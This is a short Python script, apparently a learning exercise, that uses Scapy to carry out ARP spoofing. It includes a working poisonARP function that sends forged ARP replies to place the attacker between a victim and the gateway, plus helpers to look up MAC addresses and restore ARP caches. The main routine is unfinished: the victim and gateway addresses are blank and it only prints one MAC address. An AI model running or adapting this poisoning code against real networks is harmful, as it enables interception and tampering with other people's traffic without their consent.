from scapy.all import *
from time import sleep
# 콘솔에서 실행 

def getMAC(ip):
    ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),\
                     timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf('%Ether.src%')


def poisonARP(srcip, targetip, targetmac):
    arp = ARP(op=2, psrc=srcip, pdst=targetip, hwdst=targetmac)
    send(arp)


def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
    arp1 = ARP(op=2, pdst=victimip, psrc=gatewayip,\
               hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gatewaymac)
    arp2 = ARP(op=2, pdst=gatewayip, psrc=victimip,\
               hwdst='ff:ff:ff:ff:ff:ff', hwsrc=victimmac)
    send(arp1, count=3)
    send(arp2, count=3)


def main():
    gatewayip = ''
    victimip = ''

    print(getMAC('192.168.0.1'))
    #victimmac = getMAC(victimip)


if __name__ == '__main__':
    main()

    
    
    
